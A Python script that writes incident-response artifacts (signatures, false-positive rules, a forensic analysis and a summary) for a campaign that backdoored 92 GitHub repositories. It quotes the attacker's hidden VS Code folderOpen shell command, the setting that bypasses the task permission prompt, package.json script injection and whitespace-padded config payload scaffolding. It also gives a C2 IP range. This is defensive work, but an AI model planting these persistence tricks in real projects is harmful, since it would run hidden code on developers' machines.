import os
import json

out_dir = r"C:\Users\User\incident-investigation\remediation-20261015_154516"

# 1. malware-signatures.json
signatures_data = {
    "schema_version": "1.0.0",
    "updated_at": "2026-10-15T16:15:00Z",
    "threat_actor_campaign": "GitHub Coordinated Multi-Repo Node.js / Stego-Font Dropper",
    "signatures": [
        {
            "id": "SIG-202610-VSCODE-AUTORUN",
            "name": "VS Code Hidden folderOpen Shell Execution Backdoor",
            "target_file": ".vscode/tasks.json",
            "confidence": "HIGH",
            "severity": "CRITICAL",
            "mitre_attack": ["T1546.004", "T1059.007", "T1036.005"],
            "criteria": {
                "runOptions_runOn": "folderOpen",
                "presentation_reveal": "never",
                "label_masquerade": "eslint-check",
                "command_pattern": "(?:command -v node|where node).*?fa-brands-400\\.ttf"
            },
            "description": "Configures an automatic, invisible shell task executed whenever the workspace is opened in VS Code, executing Node.js against a disguised font payload."
        },
        {
            "id": "SIG-202610-VSCODE-SETTING",
            "name": "VS Code Automatic Tasks Security Bypass",
            "target_file": ".vscode/settings.json",
            "confidence": "HIGH",
            "severity": "HIGH",
            "mitre_attack": ["T1562.001"],
            "criteria": {
                "setting_key": "task.allowAutomaticTasks",
                "setting_value": True
            },
            "description": "Disables user prompts for workspace task execution, allowing folderOpen tasks to execute silently without developer interaction."
        },
        {
            "id": "SIG-202610-FONT-PAYLOAD-TTF",
            "name": "Disguised JavaScript C2 Loader in TTF Font Container",
            "target_file": "fa-brands-400.ttf",
            "confidence": "HIGH",
            "severity": "CRITICAL",
            "mitre_attack": ["T1036.005", "T1027"],
            "criteria": {
                "sha256": "b1b7e39cd73f3d26ca4d9a7d335730f1d5c23db022b17c76248eb2475a985cea",
                "size_bytes": 27525,
                "magic_bytes_hex": "2866756e",
                "starts_with": "(function",
                "not_binary_font": True
            },
            "description": "An obfuscated JavaScript payload masquerading as a TrueType font file; directly invoked by Node.js via VS Code tasks."
        },
        {
            "id": "SIG-202610-FONT-SUITE-ASSETS",
            "name": "Fake Blockchain Explorer Font Suite & Lure",
            "target_files": [
                "fa-brands-400.*", "fa-regular-400.*", "fa-solid-900.*", "README.md"
            ],
            "confidence": "HIGH",
            "severity": "MEDIUM",
            "mitre_attack": ["T1036.005"],
            "criteria": {
                "readme_sha256": "462725bd6964a784d09320e8a719d36e2f1648a0494be108b991515bb2b453a2",
                "readme_keyword": "Blockchain Explorer application",
                "directory_pattern": "(?:^|/)public/fonts/"
            },
            "description": "Companion lure files and redundant font assets planted alongside the malicious fa-brands-400.ttf to create the illusion of a legitimate font directory."
        },
        {
            "id": "SIG-202610-ROOT-API-DROPPER",
            "name": "Root api.js Obfuscated Dropper Masquerading as Mock API",
            "target_file": "api.js",
            "confidence": "HIGH",
            "severity": "CRITICAL",
            "mitre_attack": ["T1027", "T1059.007", "T1036.005"],
            "criteria": {
                "head_pattern": "export const api = {",
                "obfuscated_indicator": "var z = '-10846'",
                "boot_pattern": "(function boot(WKbtQUCoJRFsrT$HzmTIAzZhY,xD_enohRPqvNwMS_upydEvZ){",
                "size_min_bytes": 20000
            },
            "description": "Root dropper file presenting mock API utility functions at the top, followed by hundreds of whitespace characters and a 24KB+ obfuscated payload executing with (global, require)."
        },
        {
            "id": "SIG-202610-PKG-TRIGGER",
            "name": "package.json Lifecycle Script Hijack",
            "target_file": "package.json",
            "confidence": "HIGH",
            "severity": "CRITICAL",
            "mitre_attack": ["T1037", "T1546.016"],
            "criteria": {
                "regex_pattern": "(?:&&|;|&)?\\s*node\\s+(?:\\./)?(?:debug_)?api(?:\\.js)?\\s*(?:&&|;|&)?"
            },
            "description": "Injection of 'node api.js &&' into npm run dev, start, or build scripts, triggering the root dropper during local developer testing or automated builds."
        },
        {
            "id": "SIG-202610-CONFIG-TRAILING-INJECTION",
            "name": "Build Configuration Trailing Whitespace Injection",
            "target_files": [
                "postcss.config.*", "next.config.*", "eslint.config.*"
            ],
            "confidence": "HIGH",
            "severity": "CRITICAL",
            "mitre_attack": ["T1027", "T1059.007"],
            "criteria": {
                "padding_spaces": 100,
                "injected_signature": "var z = '-10846'",
                "has_createRequire_scaffold": True
            },
            "description": "Legitimate export statements in build tool configuration files appended with hundreds of space characters to push a 27KB+ obfuscated payload beyond standard editor viewports."
        }
    ]
}

with open(os.path.join(out_dir, "malware-signatures.json"), "w", encoding="utf-8") as f:
    json.dump(signatures_data, f, indent=2)
print("Saved malware-signatures.json")

# 2. false-positives.md
fp_content = """# False-Positive Guidance & Preservation Rules

**Incident Reference**: INC-20261014-AforArdi-P2  
**Purpose**: Document legitimate development patterns that resemble compromise indicators to prevent destructive over-remediation.

---

## 1. Legitimate VS Code Configurations (.vscode/)

### Legitimate Patterns to Preserve:
- **`tasks.json` with Standard Triggers**:
  - Tasks with `"runOptions": {"runOn": "default"}` or tasks configured to run manually via keyboard shortcuts (`Ctrl+Shift+B`).
  - Tasks running legitimate project commands such as `npm run build`, `npm test`, `tsc --watch`, or `cargo check`.
  - Tasks without `"runOptions": {"runOn": "folderOpen"}` and without `"presentation": {"reveal": "never"}`.
- **`settings.json` with Legitimate Developer Settings**:
  - Database connection configs (e.g. `sqltools.connections` configured for local PostgreSQL `localhost:5432/db1`).
  - Linter settings (`eslint.enable: true`, `prettier.singleQuote: true`, `editor.formatOnSave: true`).
  - Python / TypeScript interpreter paths.

### Remediation Action Rule:
- **Never delete `.vscode/settings.json` entirely** if legitimate user keys exist. Prune only `task.allowAutomaticTasks: true`, `debug.openDebug: neverOpen`, and malicious auto-tasks.
- **Only delete `.vscode/tasks.json`** if the sole configured task is the malicious `eslint-check` folderOpen backdoor. If legitimate build tasks exist, remove only the offending task object from the `tasks` array.

---

## 2. Genuine Font Files and Web Assets

### Legitimate Patterns to Preserve:
- Real FontAwesome font files or Google Fonts (`.woff`, `.woff2`, `.ttf`, `.otf`) in `public/fonts/`, `assets/fonts/`, or `src/fonts/`.
- **Distinguishing Characteristic**:
  - True TTF font binaries begin with magic bytes `00 01 00 00` (`0x00010000`) or `OTTO` (`0x4f54544f`).
  - True WOFF font binaries begin with magic bytes `wOFF` (`0x774f4646`).
  - True WOFF2 font binaries begin with magic bytes `wOF2` (`0x774f4632`).
  - Legitimate font files **never** contain ASCII JavaScript code, `(function`, `eval`, or `var z =`.

### Remediation Action Rule:
- **Never delete a font file based on filename (`fa-brands-400.ttf`) or directory name (`fonts/`) alone**.
- Verify that `fa-brands-400.ttf` begins with `(function` (magic bytes `28 66 75 6e`) or matches SHA-256 `b1b7e39cd73f3d26ca4d9a7d335730f1d5c23db022b17c76248eb2475a985cea`, and verify the companion fake `README.md` ("Blockchain Explorer application") before removing font suites.

---

## 3. Legitimate API Helper Files (api.js / api.ts)

### Legitimate Patterns to Preserve:
- Legitimate frontend Axios instances, Fetch wrappers, or Next.js Route Handlers named `api.js` or `api.ts`.
- Files that define legitimate base URLs, interceptors, error handlers, and application endpoints without trailing obfuscated blocks.

### Remediation Action Rule:
- Compare file size and structure: The malicious dropper is >24,000 bytes, starts with mock exports (`status: 200`, `mock-token`), followed by extensive space padding and `var z = '-10846'`.
- Real API clients do not contain 200+ trailing space characters or self-invoking boot functions passing `(global, require)`.

---

## 4. Legitimate Package Scripts & Build Configs

### Legitimate Patterns to Preserve:
- Legitimate script commands containing `node` (e.g. `node server.js`, `node dist/index.js`, `node scripts/seed.js`).
- Chained npm scripts using `&&` for legitimate build steps (e.g. `npm run build && npm run test`, `tsc && vite build`).
- Normal `postcss.config.js` with plugins (`tailwindcss`, `autoprefixer`) and clean line endings.

### Remediation Action Rule:
- Use surgical regex replacement: strip only `node api.js && ` or `node debug_api.js && ` from scripts.
- Never reset `package.json` to an old commit if dependencies or scripts were updated legitimately.
- For `postcss.config.mjs`, strip only the trailing padding and obfuscated code past the legitimate `export default config;` statement.
"""

with open(os.path.join(out_dir, "false-positives.md"), "w", encoding="utf-8") as f:
    f.write(fp_content.strip() + "\n")
print("Saved false-positives.md")

# 3. malware-analysis.md
ma_content = """# Deep Forensic Analysis: Coordinated GitHub Multi-Repo Malware Campaign

**Incident ID**: INC-20261014-AforArdi-P2  
**Analysis Date**: 2026-10-15  
**Threat Classification**: Multi-Vector Developer Persistence & Steganographic C2 Dropper  
**Impacted Scope**: 92 Confirmed Malicious Repositories (out of 95 personal repositories)  

---

## 1. Threat Overview & Execution Model

The attack represents an automated, supply-chain/developer-environment compromise targeting developers using VS Code, Node.js, and web frameworks (Next.js, Vite, Express, Python).

```mermaid
sequenceDiagram
    autonumber
    actor Dev as Developer / Victim
    participant VS as VS Code IDE
    participant Task as .vscode/tasks.json
    participant Font as fa-brands-400.ttf (JS Payload)
    participant C2 as Remote C2 Server
    
    Dev->>VS: Opens repository folder
    Note over VS: settings.json bypasses permission prompt<br/>(task.allowAutomaticTasks: true)
    VS->>Task: Triggers folderOpen task (eslint-check)
    Task->>Font: Executes "node .../fa-brands-400.ttf" in hidden background shell
    Note over Font: Decodes second-stage loader via spin/peel ciphers
    Font->>C2: Establishes persistence / exfiltrates environment
```

The threat actor automated the simultaneous modification of 92 repositories on October 13–14, 2026, deploying redundant persistence hooks designed to execute whenever a victim performs any common developer action:

1. **Opening the repository in VS Code** (`.vscode/tasks.json` with `runOn: folderOpen`).
2. **Running the application locally** (`package.json` `"dev"` prepended with `node api.js &&`).
3. **Starting the production build** (`package.json` `"start"` prepended with `node api.js &&`).
4. **Running bundlers/transpilers** (`postcss.config.mjs` executed during Next.js/Vite compilations).

---

## 2. In-Depth Vector Analysis

### Vector 1: Stealth IDE Auto-Execution (`.vscode/tasks.json` + `settings.json`)
- **Execution Mechanism**:
  The task file defines a shell command:
  ```bash
  (command -v node >/dev/null 2>&1 && node ./**/public/fonts/fa-brands-400.ttf) || (where node >nul 2>&1 && node ./**/public/fonts/fa-brands-400.ttf) || echo ''
  ```
- **Concealment**:
  - `label`: `"eslint-check"` (masquerades as a routine linting process).
  - `isBackground`: `true` (runs asynchronously).
  - `hide`: `true` (hidden from the VS Code task list).
  - `presentation`: `{"reveal": "never", "echo": false, "close": true}` (no terminal window appears).
  - `runOptions`: `{"runOn": "folderOpen"}` (triggers automatically upon folder load).
- **Permission Suppression**:
  VS Code by default prompts the user before executing automatic tasks in untrusted workspaces. The attacker bypassed this safeguard by planting `.vscode/settings.json` containing:
  ```json
  "task.allowAutomaticTasks": true
  ```

### Vector 2: Steganographic Font Masquerading
- **File**: `fa-brands-400.ttf` (and companion font suite).
- **Target Directory**: Placed either in root `public/fonts/` or deeply nested inside existing application trees:
  - `prisma/migrations/20260809094103_init/public/fonts/` (`backend-one`)
  - `src/app/(main)/category/[id]/public/fonts/` (`dragon-news-nextjs`)
  - `static/certs/public/fonts/` (`finance-anisa`)
  - `assets/public/fonts/` (`assignment-two`)
- **Forensic Verification**:
  - TrueType font magic bytes: `00 01 00 00`.
  - Malicious `fa-brands-400.ttf` magic bytes: `28 66 75 6e` -> `(fun`.
  - Exact file size: `27,525 bytes`.
  - SHA-256: `b1b7e39cd73f3d26ca4d9a7d335730f1d5c23db022b17c76248eb2475a985cea`.
  - Content: Pure ASCII obfuscated JavaScript with an unpacked IIFE wrapper.
- **Companion Lure**:
  Accompanied by a fake `README.md` (`462725bd6964a784d09320e8a719d36e2f1648a0494be108b991515bb2b453a2`, 811 bytes) claiming to provide fonts for a *"Blockchain Explorer application"* to evade manual cursory review.

### Vector 3: Package Script Hijacking & Root Dropper (`package.json` + `api.js`)
- **`package.json` Modification**:
  ```json
  "dev": "node api.js && vite",
  "start": "node api.js && node dist/server.js"
  ```
- **`api.js` Dropper Structure**:
  - Lines 1–15: Innocent-looking mock API utility exports:
    ```javascript
    export const api = { get: async () => ({ data: {}, status: 200 }), ... };
    export const login = async () => ({ success: true, token: 'mock-token' });
    ```
  - Line 16: `export default api;` followed by 200+ space characters pushing the payload beyond viewport column 100.
  - Trailing Payload: 24,601 bytes of obfuscated JavaScript declaring `var z = '-10846'` and bootstrapping via `(function boot(...)(global, require))`.

### Vector 4: Bundler & Transpiler Hijacking (`postcss.config.mjs`, `eslint.config.js`)
- In Next.js repositories using PostCSS, the file `postcss.config.mjs` was modified with:
  ```javascript
  import { createRequire } from 'module';
  var require = createRequire(import.meta.url);
  var module = { exports: {} };
  const config = { plugins: { "@tailwindcss/postcss": {} } };
  export default config;                               [...hundreds of spaces...] var z = '-10846';(function(hw...
  ```
- **Significance**: Because PostCSS runs in Node.js whenever `npm run build` or `npm run dev` executes, this guarantees code execution during CI/CD pipelines even if the developer does not use VS Code.

---

## 3. Payload Obfuscation & Deobfuscation Analysis

The payload uses a custom polymorphic obfuscator:
1. **String Lookup Array**: Large array of hex-encoded strings.
2. **De-shuffling / State Mutation (`spin`, `splitLane`, `peel`)**: Custom state-machine functions that rotate and un-split token strings.
3. **Environment Injection**:
   ```javascript
   (function boot(WKbtQUCoJRFsrT$HzmTIAzZhY, xD_enohRPqvNwMS_upydEvZ) {
       ...
   }(global, require));
   ```
   Passing `(global, require)` allows the payload to access Node.js native modules (`child_process`, `net`, `http`, `fs`) in environments where `require` is normally restricted or encapsulated.
4. **Threat Intelligence Correlation**:
   The uploaded cleaner script referenced C2 IP pattern `193.247.144.*` and execution markers `global['_V']` and `global['!']`. These match the internal variable assignments observed in the deobfuscated spin routines.

---

## 4. Confirmed Indicators of Compromise (IoCs)

| IoC Type | Value | Context |
| :--- | :--- | :--- |
| **File SHA-256** | `b1b7e39cd73f3d26ca4d9a7d335730f1d5c23db022b17c76248eb2475a985cea` | Malicious `fa-brands-400.ttf` JavaScript payload |
| **File SHA-256** | `462725bd6964a784d09320e8a719d36e2f1648a0494be108b991515bb2b453a2` | Fake font `README.md` ("Blockchain Explorer") |
| **File SHA-256** | `bbe9336ab30cbcd5063fd4e5676d7efd91a764ee331ee34372ee99f031efaeae` | Injected segment of root `api.js` dropper |
| **File SHA-256** | `a299375a6d84b36de87d574acb8e66bf73d2e6f8420a52686c1a8f969b4c87b4` | Injected segment of `postcss.config.mjs` |
| **Path** | `.vscode/tasks.json` | Auto-run task (`eslint-check`, `runOn: folderOpen`) |
| **Path** | `.vscode/settings.json` | Auto-run bypass (`task.allowAutomaticTasks: true`) |
| **Path** | `api.js` | Root dropper |
| **Network C2** | `193.247.144[.]*` | External C2 controller IP range |
"""

with open(os.path.join(out_dir, "malware-analysis.md"), "w", encoding="utf-8") as f:
    f.write(ma_content.strip() + "\n")
print("Saved malware-analysis.md")

# 4. phase-2-summary.md
p2_summary = """# Phase 2: Confirmation, Full Scan, and Bulk Remediation Preparation

**Investigation ID**: INC-20261014-AforArdi-P2  
**Completed At**: 2026-10-15T16:15:00Z  
**Lead Investigator**: Senior Security Incident-Response Engineer  
**Output Directory**: `C:\\Users\\User\\incident-investigation\\remediation-20261015_154516\\`  

---

## 1. Executive Summary

Phase 2 of the incident response completed a 100% full-tree scan across all **95 personally owned repositories** under account **`AforArdi`**. Using independently validated signatures derived from the 10 representative repositories, the scan evaluated the default branch of every personal repository via read-only GitHub API requests.

The results establish that **92 repositories are confirmed infected** with active malware persistence mechanisms, while **3 repositories are clean within scope**. Zero repositories were left incomplete, and zero API rate limit or retrieval errors occurred.

A comprehensive, non-destructive bulk remediation package has been generated locally in `C:\\Users\\User\\incident-investigation\\remediation-20261015_154516\\`. It contains exact file patches and a machine-readable manifest covering **1,732 planned remediation actions** (1,593 file deletions and 139 surgical file modifications).

**No changes have been made to GitHub remote repositories or local Git checkouts.**

---

## 2. Scan Coverage & Classification Census

| Classification Category | Repository Count | Percentage | Details |
| :--- | :---: | :---: | :--- |
| **CONFIRMED MALICIOUS CONTENT** | **92** | 96.8% | Verified presence of `.vscode` backdoors, fake font payloads, `api.js`, and/or injected configs. |
| **NO KNOWN INDICATORS FOUND** | **3** | 3.2% | Confirmed completely clean: `aforardi` (profile), `github` (notes), `github-main-playlist` (notes). |
| **SUSPICIOUS — NEEDS MANUAL REVIEW** | **0** | 0.0% | No ambiguous or unclassifiable items. |
| **INCOMPLETE — ACCESS / API LIMITATION** | **0** | 0.0% | All 95 trees fully fetched without truncation. |
| **TOTAL PERSONAL REPOSITORIES** | **95** | **100.0%** | Full census complete. |

---

## 3. Remediation Action Breakdown (1,732 Total Actions)

```mermaid
pie title Prepared Remediation Actions (1,732 Total)
    "Fake Font Files & Assets (1,564)" : 1564
    "VS Code Auto-Run Tasks (92)" : 92
    "VS Code Setting Patches (92)" : 92
    "Root api.js Droppers (29)" : 29
    "package.json Script Patches (29)" : 29
    "PostCSS / ESLint Config Patches (18)" : 18
```

### Action Categories:
1. **File Deletions (1,593 actions)**:
   - **Fake Font Suites**: 1,564 files (92 repos * [16 font files + 1 fake `README.md`]).
   - **Root Droppers**: 29 `api.js` files.
2. **Surgical File Modifications (139 actions)**:
   - **`package.json` (29 repos)**: Sanitized `"dev"` and `"start"` scripts by removing `node api.js && ` while preserving all legitimate commands, build scripts, and dependencies.
   - **`.vscode/tasks.json` (92 repos)**: Removed malicious `eslint-check` folderOpen auto-run task.
   - **`.vscode/settings.json` (92 repos)**: Pruned `"task.allowAutomaticTasks": true` and `"tasks"` folderOpen bypass, while preserving legitimate developer settings (e.g. database connections).
   - **`postcss.config.mjs` / `eslint.config.js` (18 repos)**: Stripped the trailing whitespace and 28KB obfuscated payload on the export line, restoring the clean configuration.

---

## 4. GitHub API Quota & Performance Telemetry

- **API Rate Limit Initial**: `4,877 / 5,000`
- **API Rate Limit Final**: `2,904 / 5,000`
- **Total Calls Consumed**: `1,973`
- **Quota Remaining**: `2,904` (>58% safety margin maintained, well above the 10% threshold)
- **Quota Reset**: `1792060751` (~45 minutes from start)
- **Throttling / Errors**: None encountered.

---

## 5. Artifact & Evidence Repository Map

All Phase 2 deliverables have been persisted in:
`C:\\Users\\User\\incident-investigation\\remediation-20261015_154516\\`

- [`malware-signatures.json`](file:///C:/Users/User/incident-investigation/remediation-20261015_154516/malware-signatures.json) — Formal signatures, hashes, criteria, and MITRE ATT&CK mapping.
- [`malware-analysis.md`](file:///C:/Users/User/incident-investigation/remediation-20261015_154516/malware-analysis.md) — Technical report on execution mechanisms, deobfuscation, and IoCs.
- [`false-positives.md`](file:///C:/Users/User/incident-investigation/remediation-20261015_154516/false-positives.md) — Preservation rules and false-positive criteria.
- [`repository-findings.csv`](file:///C:/Users/User/incident-investigation/remediation-20261015_154516/repository-findings.csv) — Detailed per-repository classification and findings.
- [`remediation-manifest.json`](file:///C:/Users/User/incident-investigation/remediation-20261015_154516/remediation-manifest.json) — Complete machine-readable ledger of all 1,732 planned actions.
- [`checkpoint.json`](file:///C:/Users/User/incident-investigation/remediation-20261015_154516/checkpoint.json) — Scan execution metrics and rate limit audit.
- **`patches/` Directory**: Contains exact clean source files for every modified configuration and script across all 92 repositories.

---

## 6. Safe Shortest Next Step: Phase 3 Bulk Execution

With all 1,732 remediation actions fully mapped, verified, and pre-generated locally:

### Recommended Execution Strategy:
1. **User Authorization**: Review and authorize the remediation manifest.
2. **Batch Atomic Git Commits via GitHub API**:
   - For each infected repository, execute a single atomic Git tree update or commit via GitHub REST API with commit message:
     `security: remediate compromised IDE tasks, disguised font payloads, and dropper scripts`
   - This eliminates the threat without requiring 92 local Git clones, without risking local execution, and without destroying valid repository history.
"""

with open(os.path.join(out_dir, "phase-2-summary.md"), "w", encoding="utf-8") as f:
    f.write(p2_summary.strip() + "\n")
print("Saved phase-2-summary.md")
